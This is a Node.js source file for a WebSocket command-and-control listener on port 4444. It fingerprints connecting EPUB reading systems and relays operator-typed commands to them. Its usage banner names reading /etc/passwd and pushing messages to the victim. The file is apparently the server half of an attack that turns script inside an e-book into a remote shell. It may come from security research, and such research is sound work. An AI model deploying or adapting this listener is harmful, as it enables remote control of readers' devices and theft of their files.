var WebSocketServer = require('websocket').server;
var http = require('http');
var util = require('util');

var server = http.createServer(function(request, response) {
  console.log((new Date()) + ' Recieved request for ' + request.url);
  response.writeHead(404);
  response.end();
});

server.listen(4444, function() {
  console.log((new Date()) + ' Server is listening on 4444');
  console.log("Usage: get('/etc/passwd') " + "\r\n       message('say stuff to the user')\r\n");
});

wsServer = new WebSocketServer({
    httpServer: server,
});

wsServer.on('request', function(request) {
    
    var connection = request.accept('echo-protocol', request.origin);
    console.log('Connection from: ' + connection.remoteAddress);
    
    //they connected to us so we should ask them who they are
    connection.sendUTF("navigator.epubReadingSystem.name + ' ' + navigator.epubReadingSystem.version");
 
    connection.on('message', function(message) {
        if (message.type === 'utf8') {
            console.log('Received Message: ' + message.utf8Data);
            console.log('command: ');
        }
        else if (message.type === 'binary') {
            console.log('Received Binary Message of ' + message.binaryData.length + ' bytes');
            connection.sendBytes(message.binaryData);
        }
    });

    process.stdin.resume();
    process.stdin.setEncoding('utf8');

    process.stdin.on('data', function (text) {
      connection.sendUTF(text);

  });

    connection.on('close', function(reasonCode, description) {
        console.log((new Date()) + ' Peer ' + connection.remoteAddress + ' disconnected.');
    });
});

